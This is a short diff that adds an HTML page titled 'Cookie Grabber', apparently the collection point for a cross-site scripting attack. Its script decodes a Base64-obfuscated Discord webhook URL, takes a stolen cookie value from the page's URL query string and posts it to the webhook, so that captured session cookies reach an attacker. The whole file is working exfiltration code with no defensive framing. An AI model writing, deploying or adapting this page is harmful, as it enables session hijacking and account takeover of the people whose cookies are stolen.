@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Cookie Grabber</title>
+</head>
+<body>
+<script>
+  // Base64-encoded Discord webhook
+  const webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTMxOTE2MTA4MDM2NjIzOTc0NC9TUFBBQkUwS1dwZjRXaTVXTVo3UGFsRGNLSnJLa2FCc2RQSHluMndsbjJXM1lUQjNLaz9fYkxvYmE0ZEZxSk8=";
+  
+  // Decode Base64
+  const webhook = atob(webhookBase64);
+  
+  // Extract cookie from URL
+  const params = new URLSearchParams(window.location.search);
+  const cookies = params.get('c');
+
+  // Send cookies to the Discord webhook
+  fetch(webhook, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({content: 'DUmbass HaCkEr Cookie: ' + cookies})
+  }).then(r => console.log(r.ok ? 'Cookies sent.' : 'Failed to send cookies.')).catch(e => console.error('Error:', e));
+</script>
+</body>
+</html>
